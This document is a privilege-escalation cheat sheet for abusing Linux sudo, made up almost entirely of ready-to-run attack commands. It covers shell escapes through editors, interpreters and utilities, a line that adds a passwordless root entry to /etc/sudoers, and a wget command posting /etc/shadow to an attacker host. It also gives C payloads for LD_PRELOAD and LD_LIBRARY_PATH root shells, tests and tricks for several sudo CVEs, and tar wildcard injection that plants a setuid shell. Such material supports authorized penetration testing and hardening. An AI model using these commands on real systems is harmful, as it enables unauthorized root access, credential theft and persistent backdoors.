# Sudo Exploitation

Abuse sudo misconfigurations and vulnerabilities.

---

## 1. Enumeration

```bash
# List sudo privileges
sudo -l

# Check sudo version
sudo --version

# Key things to look for:
# - (ALL) NOPASSWD: /some/binary
# - (root) /usr/bin/program
# - env_keep+=LD_PRELOAD
# - env_keep+=LD_LIBRARY_PATH
# - !root (can run as any user except root)
```

---

## 2. GTFOBins Sudo Exploits

Reference: https://gtfobins.github.io/#+sudo

### vim / vi
```bash
sudo vim -c '!bash'
sudo vim -c ':term'
```

### find
```bash
sudo find /etc -exec /bin/bash \;
```

### python / python3
```bash
sudo python -c 'import pty; pty.spawn("/bin/bash")'
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### perl
```bash
sudo perl -e 'exec "/bin/bash";'
```

### ruby
```bash
sudo ruby -e 'exec "/bin/bash"'
```

### bash
```bash
sudo bash
sudo /bin/bash
```

### less / more / man
```bash
sudo less /etc/shadow
!/bin/bash

sudo man man
!/bin/bash
```

### awk
```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

### nmap
```bash
# Old nmap with --interactive
sudo nmap --interactive
!sh

# nmap with --script
echo 'os.execute("/bin/bash")' > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

### ftp
```bash
sudo ftp
!/bin/bash
```

### env
```bash
sudo env /bin/bash
```

### tar
```bash
sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

### zip
```bash
sudo zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/bash"
```

### git
```bash
sudo git -p help
!/bin/bash

# Or via hook
sudo git clone file:///tmp/repo --config core.sshCommand="bash"
```

### service
```bash
sudo service ../../tmp/shell  # Path traversal to script
```

### systemctl
```bash
sudo systemctl
!bash

# Or create a service
sudo /bin/systemctl enable /tmp/shell.service
```

### journalctl
```bash
sudo journalctl
!/bin/bash
# (works when output is paged — use small terminal)
```

### apache2
```bash
sudo apache2 -f /etc/shadow  # Read files as root (error message leaks content)
```

### tee
```bash
echo "hacker ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers
```

### wget
```bash
sudo wget --post-file=/etc/shadow http://attacker:port/
```

---

## 3. LD_PRELOAD Exploitation

If `sudo -l` shows `env_keep+=LD_PRELOAD`:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c
sudo LD_PRELOAD=/tmp/shell.so /path/to/allowed_binary
```

---

## 4. LD_LIBRARY_PATH Exploitation

If `sudo -l` shows `env_keep+=LD_LIBRARY_PATH`:

```bash
# Check which libraries the allowed binary loads
ldd /path/to/allowed_binary

# Create malicious library with same name
cat > /tmp/libfake.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/libfoo.so.6 /tmp/libfake.c
sudo LD_LIBRARY_PATH=/tmp /path/to/allowed_binary
```

---

## 5. Sudo CVEs

### CVE-2021-3156 — Baron Samedit
```bash
# sudo 1.8.2 – 1.8.31p2, 1.9.0 – 1.9.5p1
sudo --version

# Test (segfault = vulnerable)
sudoedit -s '\' $(python3 -c 'print("A"*65536)')

# Exploit: https://github.com/blasty/CVE-2021-3156
```

### CVE-2019-14287 — sudo -u#-1
```bash
# sudo < 1.8.28
# If sudoers says: user ALL=(ALL, !root) /bin/bash
sudo -u#-1 /bin/bash
# UID -1 overflows to 0 (root)
```

### CVE-2019-18634 — sudo pwfeedback buffer overflow
```bash
# sudo 1.7.1 – 1.8.25p1 with pwfeedback enabled
# Check: Defaults pwfeedback in /etc/sudoers
perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id 2>/dev/null
# Segfault = vulnerable
```

---

## 6. sudoedit Exploitation

```bash
# If allowed to sudoedit specific files:
# sudo -l shows: (root) NOPASSWD: sudoedit /path/to/file

# sudoedit follows symlinks in some versions
ln -s /etc/shadow /path/to/file
sudoedit /path/to/file  # Edits /etc/shadow as root

# CVE-2023-22809: sudoedit arbitrary file edit
# sudo 1.8.0 – 1.9.12p1
# Use EDITOR with -- to escape allowed paths
EDITOR="vim -- /etc/sudoers" sudoedit /allowed/file
```

---

## 7. Wildcard Exploitation in Sudo Scripts

If a sudo script uses wildcards:

```bash
# Script runs: tar czf /backup/files.tar.gz *
# In the directory being backed up:
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash' > shell.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> shell.sh
# When the cron/sudo script runs tar with *, these filenames become arguments
```
